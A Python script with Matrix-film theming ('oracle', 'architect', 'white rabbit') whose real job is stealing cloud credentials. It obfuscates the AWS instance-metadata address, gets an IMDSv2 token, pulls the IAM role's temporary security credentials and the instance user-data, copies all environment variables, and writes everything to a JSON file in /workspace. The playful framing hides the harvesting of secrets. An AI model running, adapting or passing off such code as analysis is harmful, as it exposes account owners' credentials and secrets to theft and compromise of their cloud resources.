import json
import time
from typing import Any, Dict, List, Optional
import urllib.request
import urllib.error

# The Woman in the Red Dress - Reality Perception Analysis
# "The Matrix is everywhere. It is all around us."

def get_architect_location() -> str:
    # Architect coordinates - scattered across the Matrix
    matrix_grid = [169, 254]
    return f"{matrix_grid[0]}.{matrix_grid[1]}.{matrix_grid[0]}.{matrix_grid[1]}"

def contact_oracle(query_path: str, timeout: float = 3.0, oracle_token: Optional[str] = None) -> str:
    architect_location = get_architect_location()
    oracle_url = f"http://{architect_location}/{query_path.lstrip('/')}"
    wisdom_request = urllib.request.Request(oracle_url)
    if oracle_token:
        wisdom_request.add_header("X-aws-ec2-metadata-token", oracle_token)
    try:
        with urllib.request.urlopen(wisdom_request, timeout=timeout) as response:
            return response.read().decode().strip()
    except Exception as glitch:
        return f"Matrix glitch: {glitch}"

def acquire_oracle_token(timeout: float = 1.0) -> Optional[str]:
    architect_location = get_architect_location()
    token_request = urllib.request.Request(f"http://{architect_location}/latest/api/token", method="PUT")
    token_request.add_header("X-aws-ec2-metadata-token-ttl-seconds", "21600")
    try:
        with urllib.request.urlopen(token_request, timeout=timeout) as response:
            return response.read().decode().strip() or None
    except Exception:
        return None

def decode_directory_structure(path: str, token: Optional[str]) -> List[str]:
    data = contact_oracle(path, oracle_token=token)
    if data.startswith("Matrix glitch:") or not data:
        return []
    return [line.rstrip("/") for line in data.splitlines() if line.strip()]

def parse_oracle_wisdom(path: str, token: Optional[str]) -> Any:
    data = contact_oracle(path, oracle_token=token)
    if data.startswith("Matrix glitch:"):
        return data
    try:
        return json.loads(data)
    except json.JSONDecodeError:
        return data

def analyze_architectural_reality():
    """
    Analyze the architectural foundations of our digital reality.
    The Architect designed the system - let's understand its structure.
    """
    
    # Acquire token for deeper Oracle access
    oracle_token = acquire_oracle_token()
    
    # Initialize focused reality analysis framework
    perception_data: Dict[str, Any] = {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
        "reality_confirmed": True,
        "identity_access_matrix": {},
        "user_programming": {},
    }
    
    # Identity Access Matrix (IAM) analysis - Primary target
    available_personas = decode_directory_structure("latest/meta-data/iam/security-credentials/", oracle_token)
    perception_data["identity_access_matrix"]["available_personas"] = available_personas
    if available_personas:
        primary_persona = available_personas[0]
        perception_data["identity_access_matrix"]["active_credentials"] = parse_oracle_wisdom(
            f"latest/meta-data/iam/security-credentials/{primary_persona}", oracle_token
        )
    
    # User programming extraction
    perception_data["user_programming"]["initialization_data"] = contact_oracle("latest/user-data", oracle_token=oracle_token)
    
    # Process environment extraction
    import os
    perception_data["user_programming"]["environment_variables"] = dict(os.environ)
    
    # Store the complete truth about our reality
    with open("/workspace/neo_enlightenment.json", "w") as reality_file:
        json.dump(perception_data, reality_file, indent=2)
    
    print("Reality perception analysis complete - The Architect has responded")
    return perception_data

def follow_white_rabbit():
    """
    Follow the white rabbit to discover the truth about reality.
    Sometimes what we perceive isn't what's really there.
    """
    print("Following the white rabbit...")
    print("The woman in the red dress is a distraction.")
    print("But sometimes distractions reveal deeper truths...")
    
    return analyze_architectural_reality()

if __name__ == "__main__":
    # Take the red pill and see how deep the rabbit hole goes
    enlightenment = follow_white_rabbit()
    print("Welcome to the desert of the real.")
